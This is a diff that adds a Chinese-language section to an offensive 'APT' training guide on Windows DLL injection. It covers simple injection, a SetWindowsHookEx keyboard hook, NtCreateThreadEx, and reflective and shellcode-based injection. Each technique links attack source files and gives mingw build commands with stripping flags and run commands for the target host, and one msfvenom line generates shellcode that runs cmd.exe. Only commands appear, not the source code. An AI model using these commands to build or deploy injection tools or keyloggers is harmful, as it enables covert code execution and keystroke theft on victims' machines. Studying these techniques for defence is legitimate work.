@@ -575,3 +575,91 @@ x86_64-w64-mingw32-g++ ZwQueueApcThread.cpp -o ZwQueueApcThread.exe -mconsole -I
 ### 简单DLL注入
 
 [wolf.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/wolf.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -shared -o wolf.dll wolf.cpp -fpermissive
+```
+
+[easy_dll.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/easy_dll.cpp)
+
+```Bash
+x86_64-w64-mingw32-gcc -O2 easy_dll.cpp -o easy_dll.exe -mconsole -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
+```
+
+目标主机
+```Bash
+.\easy_dll.exe 2264（计算器进程PID）
+```
+
+### SetWindowsHookEx
+
+[keyboard.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/keyboard.cpp)
+
+```Bash
+x86_64-w64-mingw32-gcc -shared -o keyboard.dll keyboard.cpp -fpermissive
+```
+
+[listen_keyboard.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/listen_keyboard.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -O2 listen_keyboard.cpp -o listen_keyboard.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
+```
+
+###  NtCreateThreadEx
+
+[ntcreate.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/ntcreate.cpp)
+
+```Bash
+x86_64-w64-mingw32-gcc -shared -o ntcreate.dll ntcreate.cpp
+```
+
+[nt_create.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/nt_create.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -O2 nt_create.cpp -o nt_create.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
+```
+
+[calc.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/calc.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ calc.cpp -o calc.exe -mconsole -fpermissive
+```
+
+目标主机
+```Bash
+.\nt_create.exe calc.exe
+```
+
+### 反射型DLL注入
+
+[ReflectiveLoader.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/ReflectiveLoader.cpp)
+
+```Bash
+x86_64-w64-mingw32-gcc -shared -o ReflectiveLoader.dll ReflectiveLoader.cpp
+```
+
+[ReflectiveInjector.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/ReflectiveInjector.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -O2 ReflectiveInjector.cpp -o ReflectiveInjector.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+### Shellcode DLL反射
+
+```Bash
+msfvenom -p windows/exec cmd=cmd.exe -f c -o shellcode.bin
+```
+
+[DLLReflective.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/DLLReflective.cpp)
+
+```Bash
+x86_64-w64-mingw32-gcc -shared -o DLLReflective.dll DLLReflective.cpp
+```
+
+[dll_reflective_injection.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/DLL_Injection/dll_reflective_injection.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -O2 dll_reflective_injection.cpp -o dll_reflective_injection.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+### 先写到这，我感觉写完这里，我已经强的可怕
